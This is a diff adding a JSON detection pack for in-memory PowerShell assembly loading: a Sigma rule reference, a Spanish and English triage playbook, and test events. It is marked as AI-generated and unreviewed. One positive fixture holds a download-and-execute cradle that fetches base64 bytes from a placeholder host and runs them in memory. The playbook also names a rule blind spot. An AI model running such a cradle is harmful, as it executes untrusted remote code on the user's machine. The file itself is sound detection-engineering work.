@@ -1,0 +1,134 @@
+{
+  "rule": {
+    "id": "ddcd88cb-7f62-4ce5-86f9-1704190feb0a",
+    "title": "Potential In-Memory Execution Using Reflection.Assembly",
+    "level": "medium",
+    "status": "test",
+    "author": "frack113",
+    "path": "windows/powershell/powershell_script/posh_ps_dotnet_assembly_from_file.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/powershell/powershell_script/posh_ps_dotnet_assembly_from_file.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1620"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un bloque de script de PowerShell llamó a un método de carga de [Reflection.Assembly] (Load, LoadFrom, LoadFile o LoadWithPartialName) para cargar un ensamblado .NET de forma dinámica, posiblemente solo en memoria.",
+      "what_it_detects": "Eventos 4104 de Script Block Logging en los que ScriptBlockText contiene '[Reflection.Assembly]::load'. Se excluye el script SqlPsPostScript.ps1 del módulo SQLPS de Microsoft SQL Server. La forma '[System.Reflection.Assembly]::' no coincide, así que la regla tiene ese punto ciego.",
+      "why_it_matters": "Cargar ensamblados con reflexión (ATT&CK T1620, Reflective Code Loading) permite ejecutar herramientas .NET a partir de bytes descargados o decodificados sin escribir un ejecutable en disco, lo que evade los controles basados en archivos.",
+      "triage_steps": [
+        "Lea el ScriptBlockText completo. Si MessageTotal es mayor que 1, reconstruya el script uniendo todos los fragmentos que comparten el mismo ScriptBlockId.",
+        "Vea qué recibe Load: un byte array de [Convert]::FromBase64String, una descarga (Net.WebClient, Invoke-WebRequest), un archivo descomprimido o una ruta local conocida.",
+        "Revise el campo Path: un script firmado en Program Files es menos sospechoso que un bloque sin ruta (interactivo o -EncodedCommand) o un script en %TEMP%, Downloads o AppData.",
+        "En el mismo host, en una ventana de +/- 15 minutos, identifique el proceso powershell.exe, su ParentImage y su CommandLine en Sysmon 1 o 4688. Desconfíe de padres como Office, wscript o mshta.",
+        "Busque llamadas posteriores a métodos del ensamblado (EntryPoint.Invoke, GetType().GetMethod) y conexiones de red, inyección de procesos o acceso a LSASS desde ese proceso.",
+        "Verifique si el usuario y el host suelen ejecutar este script y revise alertas anteriores para estas mismas entidades."
+      ],
+      "false_positives": [
+        "Uso legítimo de la biblioteca: scripts administrativos que cargan ensamblados como System.Windows.Forms o DLL internas con LoadWithPartialName o LoadFrom.",
+        "Módulos de proveedores, herramientas de despliegue o agentes de gestión que cargan sus propias DLL desde Program Files.",
+        "Scripts de desarrolladores o automatización (CI/CD) que prueban ensamblados .NET compilados localmente."
+      ],
+      "response_steps": [
+        "Verifique con el dueño del host o del script si la ejecución estaba autorizada y documente el script de origen y su hash.",
+        "Si se confirma que es malicioso o no se puede explicar, aísle el endpoint y termine el proceso de PowerShell después de capturar memoria si es posible.",
+        "Obtenga y analice el ensamblado o el payload codificado, y busque su hash e indicadores en otros equipos.",
+        "Restablezca las credenciales del usuario si hubo acceso a credenciales, elimine la persistencia encontrada y restaure el equipo cuando esté limpio.",
+        "Si es benigno y recurrente, agregue una exclusión precisa por Path y contenido en lugar de suprimir toda la regla."
+      ],
+      "severity_rationale": "El nivel medium es adecuado porque esta técnica es habitual en malware sin archivos, aunque también la usan muchos scripts administrativos legítimos, así que hace falta contexto para confirmar."
+    },
+    "en": {
+      "summary": "A PowerShell script block called a [Reflection.Assembly] load method (Load, LoadFrom, LoadFile or LoadWithPartialName) to load a .NET assembly dynamically, possibly only in memory.",
+      "what_it_detects": "Script Block Logging event 4104 where ScriptBlockText contains '[Reflection.Assembly]::load'. The rule excludes the Microsoft SQL Server SQLPS module script SqlPsPostScript.ps1. The '[System.Reflection.Assembly]::' form does not match, so the rule has that blind spot.",
+      "why_it_matters": "Reflective assembly loading (ATT&CK T1620, Reflective Code Loading) lets attackers run .NET tooling from downloaded or decoded bytes without writing an executable to disk, which evades file-based controls.",
+      "triage_steps": [
+        "Read the full ScriptBlockText. If MessageTotal is greater than 1, rebuild the script by joining every fragment that shares the same ScriptBlockId.",
+        "Check what Load receives: a byte array from [Convert]::FromBase64String, a download (Net.WebClient, Invoke-WebRequest), a decompressed file or a known local path.",
+        "Review Path. A signed script under Program Files is lower risk than an empty Path (interactive or -EncodedCommand) or a script in %TEMP%, Downloads or AppData.",
+        "On the same host, within +/- 15 minutes, find the powershell.exe process with its ParentImage and CommandLine in Sysmon 1 or 4688. Be suspicious of Office, wscript or mshta parents.",
+        "Look for later calls into the assembly (EntryPoint.Invoke, GetType().GetMethod) and for network connections, process injection or LSASS access from that process.",
+        "Check whether this user and host normally run this script, and review earlier alerts for the same entities."
+      ],
+      "false_positives": [
+        "Legitimate use of the library: admin scripts that load assemblies such as System.Windows.Forms or internal DLLs with LoadWithPartialName or LoadFrom.",
+        "Vendor modules, deployment tools or management agents that load their own DLLs from Program Files.",
+        "Developer or CI/CD automation scripts that test locally built .NET assemblies."
+      ],
+      "response_steps": [
+        "Confirm with the host or script owner whether the run was authorized, and record the source script and its hash.",
+        "If it is confirmed malicious or cannot be explained, isolate the endpoint and kill the PowerShell process, capturing memory first where possible.",
+        "Retrieve and analyze the assembly or encoded payload, then hunt for its hash and indicators on other hosts.",
+        "Reset the user's credentials if credential access occurred, remove any persistence you found and restore the host once it is clean.",
+        "If it is benign and recurring, add a narrow exclusion by Path and content instead of suppressing the whole rule."
+      ],
+      "severity_rationale": "Medium fits because this technique is common in fileless malware but many legitimate admin scripts use it too, so you need context to confirm it."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Interactive or encoded PowerShell decodes base64 bytes and loads them with [Reflection.Assembly]::Load. The script block has no Path.",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "WS-0142.andes.example.com",
+          "ScriptBlockText": "$b = (New-Object Net.WebClient).DownloadString('https://files.example.com/a.txt'); $asm = [Reflection.Assembly]::Load([Convert]::FromBase64String($b)); $asm.EntryPoint.Invoke($null, @(,[string[]]@()))",
+          "ScriptBlockId": "5b1f2c7e-3a41-4d8e-9c55-0a7b9e2d1f10",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": ""
+        }
+      },
+      {
+        "description": "Script in a user's temp folder loads a DLL with LoadFile, which mixed-case matching still catches.",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "WS-0217.andes.example.com",
+          "ScriptBlockText": "[reflection.assembly]::LoadFile('C:\\Users\\jperez\\AppData\\Local\\Temp\\upd.dll') | Out-Null; [Upd.Main]::Run()",
+          "ScriptBlockId": "9e0d4a12-6b7c-4f3e-8a21-c4d5e6f7a8b9",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "C:\\Users\\jperez\\AppData\\Local\\Temp\\run.ps1"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "SQL Server SQLPS post script loads assemblies with [Reflection.Assembly]::LoadWithPartialName. The SQL Server filter excludes it.",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "SQL-01.andes.example.com",
+          "ScriptBlockText": "[Reflection.Assembly]::LoadWithPartialName('Microsoft.SqlServer.Smo') | Out-Null; Set-Item function:SQLSERVER: { Set-Location SQLSERVER: }",
+          "ScriptBlockId": "1a2b3c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5d",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "C:\\Program Files (x86)\\Microsoft SQL Server\\130\\Tools\\PowerShell\\Modules\\SQLPS\\SqlPsPostScript.ps1"
+        }
+      },
+      {
+        "description": "Admin script loads Windows Forms with Add-Type instead of Reflection.Assembly, so the selection does not match.",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "WS-0142.andes.example.com",
+          "ScriptBlockText": "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Backup completed')",
+          "ScriptBlockId": "7c8d9e0f-1a2b-4c3d-9e4f-5a6b7c8d9e0f",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "C:\\Scripts\\notify.ps1"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:13+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
